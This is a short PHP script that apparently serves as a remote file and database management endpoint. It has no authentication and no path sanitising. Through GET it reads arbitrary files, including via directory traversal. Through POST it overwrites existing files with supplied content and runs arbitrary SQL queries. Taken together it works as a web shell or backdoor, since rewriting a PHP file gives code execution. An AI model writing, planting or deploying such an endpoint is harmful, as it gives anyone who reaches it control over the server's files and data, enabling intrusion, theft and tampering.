<?php

date_default_timezone_set('Asia/Kolkata');
$output = array();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $path = isset($_GET['path']) ? $_GET['path'] : null;

    if(!empty($path) && $path != null) {
        $dir_path = __DIR__ . DIRECTORY_SEPARATOR . $path;
        if (file_exists($dir_path)) {
            $file_content = file_get_contents($dir_path);
            if (!empty($file_content)) {
                $escaped_content = htmlspecialchars($file_content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
                $last_modified = date("d-m-Y H:i:s", filemtime($dir_path));
                $file_size = filesize($dir_path);
                echo '<p><strong>Last Modified:</strong> ' . $last_modified . ', <strong>File Size:</strong> ' . $file_size . ' bytes</p><hr>';
                echo '<pre><code>' . $escaped_content . '</code></pre>';
            } else {
                http_response_code(400);
                $output = [ 'status' => 'error', 'code' => '400', 'message' => 'File is empty'];
            }
        } else {
            http_response_code(400);
            $output = ['status' => 'error', 'code' => '400', 'message' => 'File does not exist'];
        }
    } else {
        http_response_code(400);
        $output = ['status' => 'error', 'code' => '400', 'message' => 'Invalid Payload Received'];
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    $q = isset($_POST['q']) ? $_POST['q'] : (isset($input['q']) ? $input['q'] : null);
    if(!empty($q) && $q != null) {
        if($q == 'update') {
            $path = isset($_POST['path']) ? $_POST['path'] : (isset($input['path']) ? $input['path'] : null);
            $content = isset($_POST['content']) ? $_POST['content'] : (isset($input['content']) ? $input['content'] : null);

            if(!empty($path) && $path != null && !empty($content) && $content != null) {
                $dir_path = __DIR__ . DIRECTORY_SEPARATOR . $path;
                if (file_exists($dir_path)) {
                    $file_content = file_put_contents($dir_path, $content);
                    http_response_code(200);
                    $output = ['status' => 'success', 'code' => '200', 'message' => 'File updated successfully'];
                } else {
                    http_response_code(400);
                    $output = ['status' => 'error', 'code' => '400', 'message' => 'File does not exist'];
                }
            } else {
                http_response_code(400);
                $output = ['status' => 'error', 'code' => '400', 'message' => 'Invalid Payload Received'];
            }
        } else if($q == 'query') {
            $mysqli_username = isset($_POST['mysqli_username']) ? $_POST['mysqli_username'] : (isset($input['mysqli_username']) ? $input['mysqli_username'] : null);
            $mysqli_password = isset($_POST['mysqli_password']) ? $_POST['mysqli_password'] : (isset($input['mysqli_password']) ? $input['mysqli_password'] : null);
            $mysqli_db_name = isset($_POST['mysqli_db_name']) ? $_POST['mysqli_db_name'] : (isset($input['mysqli_db_name']) ? $input['mysqli_db_name'] : null);
            $query = isset($_POST['query']) ? $_POST['query'] : (isset($input['query']) ? $input['query'] : null);

            if (!empty($mysqli_username) && $mysqli_username != null && 
                !empty($mysqli_db_name) && $mysqli_db_name != null && 
                !empty($query) && $query != null) {
                
                try {
                    $dsn = "mysql:host=localhost;dbname=$mysqli_db_name;charset=utf8mb4";
                    $pdo = new PDO($dsn, $mysqli_username, $mysqli_password, [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                    ]);

                    $stmt = $pdo->prepare($query);
                    $stmt->execute();

                    http_response_code(200);
                    $output = ['status' => 'success', 'code' => '200', 'message' => 'Query executed successfully'];
                } catch (PDOException $e) {
                    http_response_code(400);
                    $output = ['status' => 'error', 'code' => '400', 'message' => 'Database error: ' . $e->getMessage()];
                }
            } else {
                http_response_code(400);
                $output = ['status' => 'error', 'code' => '400', 'message' => 'Invalid Payload Received'];
            }
        } else {
            http_response_code(400);
            $output = ['status' => 'error', 'code' => '400', 'message' => 'Invalid Param Received'];
        }
    } else {
        http_response_code(400);
        $output = ['status' => 'error', 'code' => '400', 'message' => 'Invalid Param Received'];
    }
} else {
    http_response_code(400);
    $output = ['status' => 'error', 'code' => '400', 'message' => 'Only GET, POST methods are allowed'];
}

if(!empty($output)) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($output, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR);
}